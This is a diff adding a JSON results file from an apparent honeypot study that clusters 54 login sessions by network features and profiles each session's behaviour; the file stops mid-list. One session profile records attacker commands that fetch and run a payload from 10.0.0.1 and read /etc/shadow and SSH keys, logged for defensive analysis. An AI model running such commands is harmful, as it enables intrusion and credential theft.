@@ -1,0 +1,1199 @@
+{
+  "source_files": {
+    "dec_results": "data/processed/dec_results.csv",
+    "session_mapping": "data/processed/session_mapping.csv",
+    "session_details": "data/parsed/session_details.json",
+    "model_input": "data/processed/model_input.csv"
+  },
+  "validation": {
+    "total_dec_sessions": 54,
+    "total_mapping_sessions": 54,
+    "duplicate_dec_sessions": [],
+    "duplicate_mapping_sessions": [],
+    "missing_in_mapping": [],
+    "missing_in_dec": [],
+    "missing_in_session_details": []
+  },
+  "cluster_distribution": [
+    {
+      "cluster_id": 0,
+      "session_count": 1,
+      "percentage_of_sessions": 1.8519
+    },
+    {
+      "cluster_id": 1,
+      "session_count": 7,
+      "percentage_of_sessions": 12.963
+    },
+    {
+      "cluster_id": 2,
+      "session_count": 46,
+      "percentage_of_sessions": 85.1852
+    }
+  ],
+  "cluster_summary": [
+    {
+      "cluster_id": 0,
+      "session_count": 1,
+      "percentage_of_sessions": 1.8519,
+      "key_distinguishing_features": "dload=3959.739; rate=505.249; dbytes=337.000; sload=82.250; dur=0.681",
+      "dominant_behavioural_interpretation": "Command execution",
+      "top_command_categories": "file_system (1)"
+    },
+    {
+      "cluster_id": 1,
+      "session_count": 7,
+      "percentage_of_sessions": 12.963,
+      "key_distinguishing_features": "dbytes=1631.857; dload=1014.589; rate=131.044; sbytes=64.286; sload=33.766",
+      "dominant_behavioural_interpretation": "Mixed/Unclassified",
+      "top_command_categories": "reconnaissance (31); file_system (16); privilege_escalation (9); credential_attack (5); file_transfer (4)"
+    },
+    {
+      "cluster_id": 2,
+      "session_count": 46,
+      "percentage_of_sessions": 85.1852,
+      "key_distinguishing_features": "dbytes=0.000; dload=0.000; rate=0.000; sbytes=0.000; sload=0.000",
+      "dominant_behavioural_interpretation": "Credential-attack behaviour",
+      "top_command_categories": "No command category evidence"
+    }
+  ],
+  "cluster_feature_statistics": [
+    {
+      "cluster_id": 0,
+      "feature_name": "dur",
+      "mean": 0.680853,
+      "median": 0.680853,
+      "std": NaN,
+      "min": 0.680853,
+      "max": 0.680853
+    },
+    {
+      "cluster_id": 0,
+      "feature_name": "spkts",
+      "mean": 1.0,
+      "median": 1.0,
+      "std": NaN,
+      "min": 1.0,
+      "max": 1.0
+    },
+    {
+      "cluster_id": 0,
+      "feature_name": "dpkts",
+      "mean": 6.0,
+      "median": 6.0,
+      "std": NaN,
+      "min": 6.0,
+      "max": 6.0
+    },
+    {
+      "cluster_id": 0,
+      "feature_name": "sbytes",
+      "mean": 7.0,
+      "median": 7.0,
+      "std": NaN,
+      "min": 7.0,
+      "max": 7.0
+    },
+    {
+      "cluster_id": 0,
+      "feature_name": "dbytes",
+      "mean": 337.0,
+      "median": 337.0,
+      "std": NaN,
+      "min": 337.0,
+      "max": 337.0
+    },
+    {
+      "cluster_id": 0,
+      "feature_name": "rate",
+      "mean": 505.2486,
+      "median": 505.2486,
+      "std": NaN,
+      "min": 505.2486,
+      "max": 505.2486
+    },
+    {
+      "cluster_id": 0,
+      "feature_name": "sttl",
+      "mean": 64.0,
+      "median": 64.0,
+      "std": NaN,
+      "min": 64.0,
+      "max": 64.0
+    },
+    {
+      "cluster_id": 0,
+      "feature_name": "dttl",
+      "mean": 64.0,
+      "median": 64.0,
+      "std": NaN,
+      "min": 64.0,
+      "max": 64.0
+    },
+    {
+      "cluster_id": 0,
+      "feature_name": "sload",
+      "mean": 82.2498,
+      "median": 82.2498,
+      "std": NaN,
+      "min": 82.2498,
+      "max": 82.2498
+    },
+    {
+      "cluster_id": 0,
+      "feature_name": "dload",
+      "mean": 3959.7387,
+      "median": 3959.7387,
+      "std": NaN,
+      "min": 3959.7387,
+      "max": 3959.7387
+    },
+    {
+      "cluster_id": 0,
+      "feature_name": "sinpkt",
+      "mean": 0.0,
+      "median": 0.0,
+      "std": NaN,
+      "min": 0.0,
+      "max": 0.0
+    },
+    {
+      "cluster_id": 0,
+      "feature_name": "dinpkt",
+      "mean": 0.131427,
+      "median": 0.131427,
+      "std": NaN,
+      "min": 0.131427,
+      "max": 0.131427
+    },
+    {
+      "cluster_id": 0,
+      "feature_name": "sjit",
+      "mean": 0.0,
+      "median": 0.0,
+      "std": NaN,
+      "min": 0.0,
+      "max": 0.0
+    },
+    {
+      "cluster_id": 0,
+      "feature_name": "djit",
+      "mean": 0.254219,
+      "median": 0.254219,
+      "std": NaN,
+      "min": 0.254219,
+      "max": 0.254219
+    },
+    {
+      "cluster_id": 0,
+      "feature_name": "tcprtt",
+      "mean": 0.022713,
+      "median": 0.022713,
+      "std": NaN,
+      "min": 0.022713,
+      "max": 0.022713
+    },
+    {
+      "cluster_id": 0,
+      "feature_name": "synack",
+      "mean": 0.010221,
+      "median": 0.010221,
+      "std": NaN,
+      "min": 0.010221,
+      "max": 0.010221
+    },
+    {
+      "cluster_id": 0,
+      "feature_name": "ackdat",
+      "mean": 0.561605,
+      "median": 0.561605,
+      "std": NaN,
+      "min": 0.561605,
+      "max": 0.561605
+    },
+    {
+      "cluster_id": 0,
+      "feature_name": "ct_srv_src",
+      "mean": 54.0,
+      "median": 54.0,
+      "std": NaN,
+      "min": 54.0,
+      "max": 54.0
+    },
+    {
+      "cluster_id": 0,
+      "feature_name": "ct_state_ttl",
+      "mean": 1.0,
+      "median": 1.0,
+      "std": NaN,
+      "min": 1.0,
+      "max": 1.0
+    },
+    {
+      "cluster_id": 0,
+      "feature_name": "ct_dst_ltm",
+      "mean": 54.0,
+      "median": 54.0,
+      "std": NaN,
+      "min": 54.0,
+      "max": 54.0
+    },
+    {
+      "cluster_id": 0,
+      "feature_name": "ct_src_ltm",
+      "mean": 54.0,
+      "median": 54.0,
+      "std": NaN,
+      "min": 54.0,
+      "max": 54.0
+    },
+    {
+      "cluster_id": 0,
+      "feature_name": "ct_srv_dst",
+      "mean": 54.0,
+      "median": 54.0,
+      "std": NaN,
+      "min": 54.0,
+      "max": 54.0
+    },
+    {
+      "cluster_id": 1,
+      "feature_name": "dur",
+      "mean": 14.32912871,
+      "median": 11.383391,
+      "std": 5.0420783,
+      "min": 10.762586,
+      "max": 21.895156
+    },
+    {
+      "cluster_id": 1,
+      "feature_name": "spkts",
+      "mean": 6.28571429,
+      "median": 6.0,
+      "std": 0.48795004,
+      "min": 6.0,
+      "max": 7.0
+    },
+    {
+      "cluster_id": 1,
+      "feature_name": "dpkts",
+      "mean": 6.0,
+      "median": 6.0,
+      "std": 0.0,
+      "min": 6.0,
+      "max": 6.0
+    },
+    {
+      "cluster_id": 1,
+      "feature_name": "sbytes",
+      "mean": 64.28571429,
+      "median": 42.0,
+      "std": 38.06010284,
+      "min": 42.0,
+      "max": 120.0
+    },
+    {
+      "cluster_id": 1,
+      "feature_name": "dbytes",
+      "mean": 1631.85714286,
+      "median": 1725.0,
+      "std": 159.07171189,
+      "min": 1399.0,
+      "max": 1725.0
+    },
+    {
+      "cluster_id": 1,
+      "feature_name": "rate",
+      "mean": 131.04435714,
+      "median": 155.2262,
+      "std": 42.08736362,
+      "min": 69.3761,
+      "max": 164.1799
+    },
+    {
+      "cluster_id": 1,
+      "feature_name": "sttl",
+      "mean": 64.0,
+      "median": 64.0,
+      "std": 0.0,
+      "min": 64.0,
+      "max": 64.0
+    },
+    {
+      "cluster_id": 1,
+      "feature_name": "dttl",
+      "mean": 64.0,
+      "median": 64.0,
+      "std": 0.0,
+      "min": 64.0,
+      "max": 64.0
+    },
+    {
+      "cluster_id": 1,
+      "feature_name": "sload",
+      "mean": 33.76554286,
+      "median": 29.9352,
+      "std": 7.28674078,
+      "min": 27.3155,
+      "max": 44.7366
+    },
+    {
+      "cluster_id": 1,
+      "feature_name": "dload",
+      "mean": 1014.5891,
+      "median": 1212.2925,
+      "std": 343.65192996,
+      "min": 511.1633,
+      "max": 1282.2197
+    },
+    {
+      "cluster_id": 1,
+      "feature_name": "sinpkt",
+      "mean": 2.44990786,
+      "median": 2.059067,
+      "std": 0.67735174,
+      "min": 1.936846,
+      "max": 3.468714
+    },
+    {
+      "cluster_id": 1,
+      "feature_name": "dinpkt",
+      "mean": 2.76560157,
+      "median": 2.17517,
+      "std": 1.0083622,
+      "min": 2.05265,
+      "max": 4.277884
+    },
+    {
+      "cluster_id": 1,
+      "feature_name": "sjit",
+      "mean": 1.73704957,
+      "median": 0.645231,
+      "std": 1.9143473,
+      "min": 0.4598,
+      "max": 4.557605
+    },
+    {
+      "cluster_id": 1,
+      "feature_name": "djit",
+      "mean": 6.13591629,
+      "median": 4.823299,
+      "std": 2.25878089,
+      "min": 4.550861,
+      "max": 9.527777
+    },
+    {
+      "cluster_id": 1,
+      "feature_name": "tcprtt",
+      "mean": 0.00861229,
+      "median": 0.007884,
+      "std": 0.00314552,
+      "min": 0.005093,
+      "max": 0.014574
+    },
+    {
+      "cluster_id": 1,
+      "feature_name": "synack",
+      "mean": 0.00387557,
+      "median": 0.003548,
+      "std": 0.00141535,
+      "min": 0.002292,
+      "max": 0.006558
+    },
+    {
+      "cluster_id": 1,
+      "feature_name": "ackdat",
+      "mean": 0.574658,
+      "median": 0.561787,
+      "std": 0.03219117,
+      "min": 0.558807,
+      "max": 0.647275
+    },
+    {
+      "cluster_id": 1,
+      "feature_name": "ct_srv_src",
+      "mean": 54.0,
+      "median": 54.0,
+      "std": 0.0,
+      "min": 54.0,
+      "max": 54.0
+    },
+    {
+      "cluster_id": 1,
+      "feature_name": "ct_state_ttl",
+      "mean": 1.0,
+      "median": 1.0,
+      "std": 0.0,
+      "min": 1.0,
+      "max": 1.0
+    },
+    {
+      "cluster_id": 1,
+      "feature_name": "ct_dst_ltm",
+      "mean": 54.0,
+      "median": 54.0,
+      "std": 0.0,
+      "min": 54.0,
+      "max": 54.0
+    },
+    {
+      "cluster_id": 1,
+      "feature_name": "ct_src_ltm",
+      "mean": 54.0,
+      "median": 54.0,
+      "std": 0.0,
+      "min": 54.0,
+      "max": 54.0
+    },
+    {
+      "cluster_id": 1,
+      "feature_name": "ct_srv_dst",
+      "mean": 54.0,
+      "median": 54.0,
+      "std": 0.0,
+      "min": 54.0,
+      "max": 54.0
+    },
+    {
+      "cluster_id": 2,
+      "feature_name": "dur",
+      "mean": 2.96725765,
+      "median": 3.0304665,
+      "std": 1.69221987,
+      "min": 0.012576,
+      "max": 5.053773
+    },
+    {
+      "cluster_id": 2,
+      "feature_name": "spkts",
+      "mean": 0.0,
+      "median": 0.0,
+      "std": 0.0,
+      "min": 0.0,
+      "max": 0.0
+    },
+    {
+      "cluster_id": 2,
+      "feature_name": "dpkts",
+      "mean": 2.93478261,
+      "median": 3.0,
+      "std": 0.44232587,
+      "min": 0.0,
+      "max": 3.0
+    },
+    {
+      "cluster_id": 2,
+      "feature_name": "sbytes",
+      "mean": 0.0,
+      "median": 0.0,
+      "std": 0.0,
+      "min": 0.0,
+      "max": 0.0
+    },
+    {
+      "cluster_id": 2,
+      "feature_name": "dbytes",
+      "mean": 0.0,
+      "median": 0.0,
+      "std": 0.0,
+      "min": 0.0,
+      "max": 0.0
+    },
+    {
+      "cluster_id": 2,
+      "feature_name": "rate",
+      "mean": 0.0,
+      "median": 0.0,
+      "std": 0.0,
+      "min": 0.0,
+      "max": 0.0
+    },
+    {
+      "cluster_id": 2,
+      "feature_name": "sttl",
+      "mean": 64.0,
+      "median": 64.0,
+      "std": 0.0,
+      "min": 64.0,
+      "max": 64.0
+    },
+    {
+      "cluster_id": 2,
+      "feature_name": "dttl",
+      "mean": 64.0,
+      "median": 64.0,
+      "std": 0.0,
+      "min": 64.0,
+      "max": 64.0
+    },
+    {
+      "cluster_id": 2,
+      "feature_name": "sload",
+      "mean": 0.0,
+      "median": 0.0,
+      "std": 0.0,
+      "min": 0.0,
+      "max": 0.0
+    },
+    {
+      "cluster_id": 2,
+      "feature_name": "dload",
+      "mean": 0.0,
+      "median": 0.0,
+      "std": 0.0,
+      "min": 0.0,
+      "max": 0.0
+    },
+    {
+      "cluster_id": 2,
+      "feature_name": "sinpkt",
+      "mean": 0.0,
+      "median": 0.0,
+      "std": 0.0,
+      "min": 0.0,
+      "max": 0.0
+    },
+    {
+      "cluster_id": 2,
+      "feature_name": "dinpkt",
+      "mean": 0.00854176,
+      "median": 0.0074545,
+      "std": 0.00485655,
+      "min": 0.0,
+      "max": 0.02848
+    },
+    {
+      "cluster_id": 2,
+      "feature_name": "sjit",
+      "mean": 0.0,
+      "median": 0.0,
+      "std": 0.0,
+      "min": 0.0,
+      "max": 0.0
+    },
+    {
+      "cluster_id": 2,
+      "feature_name": "djit",
+      "mean": 0.00796348,
+      "median": 0.0060625,
+      "std": 0.00704972,
+      "min": 0.0,
+      "max": 0.038773
+    },
+    {
+      "cluster_id": 2,
+      "feature_name": "tcprtt",
+      "mean": 0.0106183,
+      "median": 0.006395,
+      "std": 0.00725578,
+      "min": 0.0,
+      "max": 0.026144
+    },
+    {
+      "cluster_id": 2,
+      "feature_name": "synack",
+      "mean": 0.00477826,
+      "median": 0.002878,
+      "std": 0.00326518,
+      "min": 0.0,
+      "max": 0.011765
+    },
+    {
+      "cluster_id": 2,
+      "feature_name": "ackdat",
+      "mean": 0.0,
+      "median": 0.0,
+      "std": 0.0,
+      "min": 0.0,
+      "max": 0.0
+    },
+    {
+      "cluster_id": 2,
+      "feature_name": "ct_srv_src",
+      "mean": 54.0,
+      "median": 54.0,
+      "std": 0.0,
+      "min": 54.0,
+      "max": 54.0
+    },
+    {
+      "cluster_id": 2,
+      "feature_name": "ct_state_ttl",
+      "mean": 1.0,
+      "median": 1.0,
+      "std": 0.0,
+      "min": 1.0,
+      "max": 1.0
+    },
+    {
+      "cluster_id": 2,
+      "feature_name": "ct_dst_ltm",
+      "mean": 54.0,
+      "median": 54.0,
+      "std": 0.0,
+      "min": 54.0,
+      "max": 54.0
+    },
+    {
+      "cluster_id": 2,
+      "feature_name": "ct_src_ltm",
+      "mean": 54.0,
+      "median": 54.0,
+      "std": 0.0,
+      "min": 54.0,
+      "max": 54.0
+    },
+    {
+      "cluster_id": 2,
+      "feature_name": "ct_srv_dst",
+      "mean": 54.0,
+      "median": 54.0,
+      "std": 0.0,
+      "min": 54.0,
+      "max": 54.0
+    }
+  ],
+  "cluster_command_analysis": [
+    {
+      "cluster_id": 0,
+      "command_or_category": "file_system",
+      "frequency": 1,
+      "sessions_containing": 1,
+      "percentage_of_sessions": 100.0
+    },
+    {
+      "cluster_id": 1,
+      "command_or_category": "reconnaissance",
+      "frequency": 31,
+      "sessions_containing": 7,
+      "percentage_of_sessions": 23.3333
+    },
+    {
+      "cluster_id": 1,
+      "command_or_category": "file_system",
+      "frequency": 16,
+      "sessions_containing": 7,
+      "percentage_of_sessions": 23.3333
+    },
+    {
+      "cluster_id": 1,
+      "command_or_category": "privilege_escalation",
+      "frequency": 9,
+      "sessions_containing": 7,
+      "percentage_of_sessions": 23.3333
+    },
+    {
+      "cluster_id": 1,
+      "command_or_category": "credential_attack",
+      "frequency": 5,
+      "sessions_containing": 5,
+      "percentage_of_sessions": 16.6667
+    },
+    {
+      "cluster_id": 1,
+      "command_or_category": "file_transfer",
+      "frequency": 4,
+      "sessions_containing": 2,
+      "percentage_of_sessions": 6.6667
+    },
+    {
+      "cluster_id": 1,
+      "command_or_category": "networking",
+      "frequency": 2,
+      "sessions_containing": 2,
+      "percentage_of_sessions": 6.6667
+    }
+  ],
+  "session_behaviour_profiles": [
+    {
+      "session_id": "f462237bf38f",
+      "dec_cluster": 2,
+      "evidence_count": 0,
+      "observed_command_categories": "",
+      "observed_commands": "",
+      "behavioural_interpretation": "Credential-attack behaviour",
+      "evidence": "Authentication success flag: 0; Session duration: 3.052236"
+    },
+    {
+      "session_id": "d71473f8df1f",
+      "dec_cluster": 2,
+      "evidence_count": 0,
+      "observed_command_categories": "",
+      "observed_commands": "",
+      "behavioural_interpretation": "Credential-attack behaviour",
+      "evidence": "Authentication success flag: 0; Session duration: 5.033859"
+    },
+    {
+      "session_id": "ac3d855b1968",
+      "dec_cluster": 2,
+      "evidence_count": 0,
+      "observed_command_categories": "",
+      "observed_commands": "",
+      "behavioural_interpretation": "Credential-attack behaviour",
+      "evidence": "Authentication success flag: 0; Session duration: 1.024292"
+    },
+    {
+      "session_id": "a38c819b1e32",
+      "dec_cluster": 2,
+      "evidence_count": 0,
+      "observed_command_categories": "",
+      "observed_commands": "",
+      "behavioural_interpretation": "Credential-attack behaviour",
+      "evidence": "Authentication success flag: 0; Session duration: 3.027873"
+    },
+    {
+      "session_id": "32869237e7ef",
+      "dec_cluster": 2,
+      "evidence_count": 0,
+      "observed_command_categories": "",
+      "observed_commands": "",
+      "behavioural_interpretation": "Credential-attack behaviour",
+      "evidence": "Authentication success flag: 0; Session duration: 5.025731"
+    },
+    {
+      "session_id": "51fb60d24936",
+      "dec_cluster": 2,
+      "evidence_count": 0,
+      "observed_command_categories": "",
+      "observed_commands": "",
+      "behavioural_interpretation": "Credential-attack behaviour",
+      "evidence": "Authentication success flag: 0; Session duration: 1.031487"
+    },
+    {
+      "session_id": "9d1ef0c58c99",
+      "dec_cluster": 2,
+      "evidence_count": 0,
+      "observed_command_categories": "",
+      "observed_commands": "",
+      "behavioural_interpretation": "Credential-attack behaviour",
+      "evidence": "Authentication success flag: 0; Session duration: 3.041352"
+    },
+    {
+      "session_id": "ee5d28aed1d9",
+      "dec_cluster": 2,
+      "evidence_count": 0,
+      "observed_command_categories": "",
+      "observed_commands": "",
+      "behavioural_interpretation": "Credential-attack behaviour",
+      "evidence": "Authentication success flag: 0; Session duration: 4.999603"
+    },
+    {
+      "session_id": "b05fefef8ce6",
+      "dec_cluster": 2,
+      "evidence_count": 0,
+      "observed_command_categories": "",
+      "observed_commands": "",
+      "behavioural_interpretation": "Credential-attack behaviour",
+      "evidence": "Authentication success flag: 0; Session duration: 1.026818"
+    },
+    {
+      "session_id": "dd221d3d8907",
+      "dec_cluster": 2,
+      "evidence_count": 0,
+      "observed_command_categories": "",
+      "observed_commands": "",
+      "behavioural_interpretation": "Credential-attack behaviour",
+      "evidence": "Authentication success flag: 0; Session duration: 3.042385"
+    },
+    {
+      "session_id": "ef9ae2a7b93e",
+      "dec_cluster": 2,
+      "evidence_count": 0,
+      "observed_command_categories": "",
+      "observed_commands": "",
+      "behavioural_interpretation": "Credential-attack behaviour",
+      "evidence": "Authentication success flag: 0; Session duration: 5.017383"
+    },
+    {
+      "session_id": "89b931c57cf0",
+      "dec_cluster": 2,
+      "evidence_count": 0,
+      "observed_command_categories": "",
+      "observed_commands": "",
+      "behavioural_interpretation": "Credential-attack behaviour",
+      "evidence": "Authentication success flag: 0; Session duration: 1.028491"
+    },
+    {
+      "session_id": "5f63552c8ff9",
+      "dec_cluster": 2,
+      "evidence_count": 0,
+      "observed_command_categories": "",
+      "observed_commands": "",
+      "behavioural_interpretation": "Credential-attack behaviour",
+      "evidence": "Authentication success flag: 0; Session duration: 3.022803"
+    },
+    {
+      "session_id": "4d2398ddaebd",
+      "dec_cluster": 2,
+      "evidence_count": 0,
+      "observed_command_categories": "",
+      "observed_commands": "",
+      "behavioural_interpretation": "Credential-attack behaviour",
+      "evidence": "Authentication success flag: 0; Session duration: 5.053773"
+    },
+    {
+      "session_id": "a97f79dabf58",
+      "dec_cluster": 2,
+      "evidence_count": 0,
+      "observed_command_categories": "",
+      "observed_commands": "",
+      "behavioural_interpretation": "Credential-attack behaviour",
+      "evidence": "Authentication success flag: 0; Session duration: 1.087941"
+    },
+    {
+      "session_id": "e3bf9c0aba5a",
+      "dec_cluster": 2,
+      "evidence_count": 0,
+      "observed_command_categories": "",
+      "observed_commands": "",
+      "behavioural_interpretation": "Credential-attack behaviour",
+      "evidence": "Authentication success flag: 0; Session duration: 0.012576"
+    },
+    {
+      "session_id": "88cbfb56c025",
+      "dec_cluster": 1,
+      "evidence_count": 9,
+      "observed_command_categories": "credential_attack, file_system, privilege_escalation, reconnaissance",
+      "observed_commands": "cat /etc/passwd, exit, ls -la, pwd, uname -a, whoami",
+      "behavioural_interpretation": "Mixed/Unclassified",
+      "evidence": "Observed commands: cat /etc/passwd, exit, ls -la, pwd, uname -a; Command categories: credential_attack, file_system, privilege_escalation, reconnaissance; Authentication success flag: 1; Session duration: 11.224239"
+    },
+    {
+      "session_id": "61c8acc77ac0",
+      "dec_cluster": 2,
+      "evidence_count": 0,
+      "observed_command_categories": "",
+      "observed_commands": "",
+      "behavioural_interpretation": "Credential-attack behaviour",
+      "evidence": "Authentication success flag: 0; Session duration: 3.016371"
+    },
+    {
+      "session_id": "b6631a298bbe",
+      "dec_cluster": 2,
+      "evidence_count": 0,
+      "observed_command_categories": "",
+      "observed_commands": "",
+      "behavioural_interpretation": "Credential-attack behaviour",
+      "evidence": "Authentication success flag: 0; Session duration: 5.02615"
+    },
+    {
+      "session_id": "550d7307de41",
+      "dec_cluster": 2,
+      "evidence_count": 0,
+      "observed_command_categories": "",
+      "observed_commands": "",
+      "behavioural_interpretation": "Credential-attack behaviour",
+      "evidence": "Authentication success flag: 0; Session duration: 1.043806"
+    },
+    {
+      "session_id": "4274b92e611f",
+      "dec_cluster": 2,
+      "evidence_count": 0,
+      "observed_command_categories": "",
+      "observed_commands": "",
+      "behavioural_interpretation": "Credential-attack behaviour",
+      "evidence": "Authentication success flag: 0; Session duration: 3.035058"
+    },
+    {
+      "session_id": "beee8328f833",
+      "dec_cluster": 2,
+      "evidence_count": 0,
+      "observed_command_categories": "",
+      "observed_commands": "",
+      "behavioural_interpretation": "Credential-attack behaviour",
+      "evidence": "Authentication success flag: 0; Session duration: 5.036278"
+    },
+    {
+      "session_id": "06023ffe4e8f",
+      "dec_cluster": 2,
+      "evidence_count": 0,
+      "observed_command_categories": "",
+      "observed_commands": "",
+      "behavioural_interpretation": "Credential-attack behaviour",
+      "evidence": "Authentication success flag: 0; Session duration: 1.021606"
+    },
+    {
+      "session_id": "73eae1d369a7",
+      "dec_cluster": 2,
+      "evidence_count": 0,
+      "observed_command_categories": "",
+      "observed_commands": "",
+      "behavioural_interpretation": "Credential-attack behaviour",
+      "evidence": "Authentication success flag: 0; Session duration: 3.038923"
+    },
+    {
+      "session_id": "4ce6f4212524",
+      "dec_cluster": 2,
+      "evidence_count": 0,
+      "observed_command_categories": "",
+      "observed_commands": "",
+      "behavioural_interpretation": "Credential-attack behaviour",
+      "evidence": "Authentication success flag: 0; Session duration: 5.046908"
+    },
+    {
+      "session_id": "735512cb6ad6",
+      "dec_cluster": 2,
+      "evidence_count": 0,
+      "observed_command_categories": "",
+      "observed_commands": "",
+      "behavioural_interpretation": "Credential-attack behaviour",
+      "evidence": "Authentication success flag: 0; Session duration: 1.020972"
+    },
+    {
+      "session_id": "e422abb51310",
+      "dec_cluster": 2,
+      "evidence_count": 0,
+      "observed_command_categories": "",
+      "observed_commands": "",
+      "behavioural_interpretation": "Credential-attack behaviour",
+      "evidence": "Authentication success flag: 0; Session duration: 3.020491"
+    },
+    {
+      "session_id": "bdf3eea00cb2",
+      "dec_cluster": 2,
+      "evidence_count": 0,
+      "observed_command_categories": "",
+      "observed_commands": "",
+      "behavioural_interpretation": "Credential-attack behaviour",
+      "evidence": "Authentication success flag: 0; Session duration: 5.036959"
+    },
+    {
+      "session_id": "8f4b8848e9d4",
+      "dec_cluster": 2,
+      "evidence_count": 0,
+      "observed_command_categories": "",
+      "observed_commands": "",
+      "behavioural_interpretation": "Credential-attack behaviour",
+      "evidence": "Authentication success flag: 0; Session duration: 1.020075"
+    },
+    {
+      "session_id": "0c944d8ff17c",
+      "dec_cluster": 2,
+      "evidence_count": 0,
+      "observed_command_categories": "",
+      "observed_commands": "",
+      "behavioural_interpretation": "Credential-attack behaviour",
+      "evidence": "Authentication success flag: 0; Session duration: 3.053884"
+    },
+    {
+      "session_id": "6f227371a1e8",
+      "dec_cluster": 2,
+      "evidence_count": 0,
+      "observed_command_categories": "",
+      "observed_commands": "",
+      "behavioural_interpretation": "Credential-attack behaviour",
+      "evidence": "Authentication success flag: 0; Session duration: 5.026024"
+    },
+    {
+      "session_id": "0c159145218d",
+      "dec_cluster": 2,
+      "evidence_count": 0,
+      "observed_command_categories": "",
+      "observed_commands": "",
+      "behavioural_interpretation": "Credential-attack behaviour",
+      "evidence": "Authentication success flag: 0; Session duration: 1.026591"
+    },
+    {
+      "session_id": "4f8484ce537b",
+      "dec_cluster": 0,
+      "evidence_count": 1,
+      "observed_command_categories": "file_system",
+      "observed_commands": "cd /tmp",
+      "behavioural_interpretation": "Command execution",
+      "evidence": "Observed commands: cd /tmp; Command categories: file_system; Authentication success flag: 1; Session duration: 0.680853"
+    },
+    {
+      "session_id": "5a28ab472e4d",
+      "dec_cluster": 2,
+      "evidence_count": 0,
+      "observed_command_categories": "",
+      "observed_commands": "",
+      "behavioural_interpretation": "Credential-attack behaviour",
+      "evidence": "Authentication success flag: 0; Session duration: 3.02418"
+    },
+    {
+      "session_id": "c1f665bb3d28",
+      "dec_cluster": 2,
+      "evidence_count": 0,
+      "observed_command_categories": "",
+      "observed_commands": "",
+      "behavioural_interpretation": "Credential-attack behaviour",
+      "evidence": "Authentication success flag: 0; Session duration: 5.042517"
+    },
+    {
+      "session_id": "c8604f6bc04e",
+      "dec_cluster": 2,
+      "evidence_count": 0,
+      "observed_command_categories": "",
+      "observed_commands": "",
+      "behavioural_interpretation": "Credential-attack behaviour",
+      "evidence": "Authentication success flag: 0; Session duration: 1.022226"
+    },
+    {
+      "session_id": "78a1934b13ae",
+      "dec_cluster": 2,
+      "evidence_count": 0,
+      "observed_command_categories": "",
+      "observed_commands": "",
+      "behavioural_interpretation": "Credential-attack behaviour",
+      "evidence": "Authentication success flag: 0; Session duration: 3.024077"
+    },
+    {
+      "session_id": "549e5293bd98",
+      "dec_cluster": 2,
+      "evidence_count": 0,
+      "observed_command_categories": "",
+      "observed_commands": "",
+      "behavioural_interpretation": "Credential-attack behaviour",
+      "evidence": "Authentication success flag: 0; Session duration: 5.027273"
+    },
+    {
+      "session_id": "6f2f15672ca5",
+      "dec_cluster": 2,
+      "evidence_count": 0,
+      "observed_command_categories": "",
+      "observed_commands": "",
+      "behavioural_interpretation": "Credential-attack behaviour",
+      "evidence": "Authentication success flag: 0; Session duration: 1.020532"
+    },
+    {
+      "session_id": "ccba58b29c45",
+      "dec_cluster": 2,
+      "evidence_count": 0,
+      "observed_command_categories": "",
+      "observed_commands": "",
+      "behavioural_interpretation": "Credential-attack behaviour",
+      "evidence": "Authentication success flag: 0; Session duration: 3.080267"
+    },
+    {
+      "session_id": "9a4ec106110f",
+      "dec_cluster": 2,
+      "evidence_count": 0,
+      "observed_command_categories": "",
+      "observed_commands": "",
+      "behavioural_interpretation": "Credential-attack behaviour",
+      "evidence": "Authentication success flag: 0; Session duration: 5.027655"
+    },
+    {
+      "session_id": "0b7bcca97f3c",
+      "dec_cluster": 2,
+      "evidence_count": 0,
+      "observed_command_categories": "",
+      "observed_commands": "",
+      "behavioural_interpretation": "Credential-attack behaviour",
+      "evidence": "Authentication success flag: 0; Session duration: 1.042789"
+    },
+    {
+      "session_id": "9754d144af49",
+      "dec_cluster": 2,
+      "evidence_count": 0,
+      "observed_command_categories": "",
+      "observed_commands": "",
+      "behavioural_interpretation": "Credential-attack behaviour",
+      "evidence": "Authentication success flag: 0; Session duration: 3.025239"
+    },
+    {
+      "session_id": "3040ed94d428",
+      "dec_cluster": 2,
+      "evidence_count": 0,
+      "observed_command_categories": "",
+      "observed_commands": "",
+      "behavioural_interpretation": "Credential-attack behaviour",
+      "evidence": "Authentication success flag: 0; Session duration: 5.027972"
+    },
+    {
+      "session_id": "76bbeca4b01a",
+      "dec_cluster": 2,
+      "evidence_count": 0,
+      "observed_command_categories": "",
+      "observed_commands": "",
+      "behavioural_interpretation": "Credential-attack behaviour",
+      "evidence": "Authentication success flag: 0; Session duration: 1.022938"
+    },
+    {
+      "session_id": "fd8b54123ea9",
+      "dec_cluster": 2,
+      "evidence_count": 0,
+      "observed_command_categories": "",
+      "observed_commands": "",
+      "behavioural_interpretation": "Credential-attack behaviour",
+      "evidence": "Authentication success flag: 0; Session duration: 3.03306"
+    },
+    {
+      "session_id": "b70abb50f812",
+      "dec_cluster": 2,
+      "evidence_count": 0,
+      "observed_command_categories": "",
+      "observed_commands": "",
+      "behavioural_interpretation": "Credential-attack behaviour",
+      "evidence": "Authentication success flag: 0; Session duration: 5.034402"
+    },
+    {
+      "session_id": "af40e96bfe91",
+      "dec_cluster": 2,
+      "evidence_count": 0,
+      "observed_command_categories": "",
+      "observed_commands": "",
+      "behavioural_interpretation": "Credential-attack behaviour",
+      "evidence": "Authentication success flag: 0; Session duration: 1.040026"
+    },
+    {
+      "session_id": "a4c62363d8d6",
+      "dec_cluster": 1,
+      "evidence_count": 11,
+      "observed_command_categories": "file_system, file_transfer, networking, privilege_escalation, reconnaissance",
+      "observed_commands": "./payload &, cat /etc/shadow, chmod +x payload, curl http://10.0.0.1/c2_payload > payload, exit, find / -name id_rsa 2>/dev/null, id",
+      "behavioural_interpretation": "Download or payload retrieval",
+      "evidence": "Observed commands: ./payload &, cat /etc/shadow, chmod +x payload, curl http://10.0.0.1/c2_payload > payload, exit; Command categories: file_system, file_transfer, networking, privilege_escalation, reconnaissance; Authentication success flag: 1; Session duration: 21.458934"
+    },
+    {
+      "session_id": "1f53fe8bd0ff",
+      "dec_cluster": 1,
+      "evidence_count": 9,
+      "observed_command_categories": "credential_attack, file_system, privilege_escalation, reconnaissance",
+      "observed_commands": "cat /etc/passwd, exit, ls -la, pwd, uname -a, whoami",
+      "behavioural_interpretation": "Mixed/Unclassified",
+      "evidence": "Observed commands: cat /etc/passwd, exit, ls -la, pwd, uname -a; Command categories: credential_attack, file_system, privilege_escalation, reconnaissance; Authentication success flag: 1; Session duration: 10.762586"
+    },
+    {
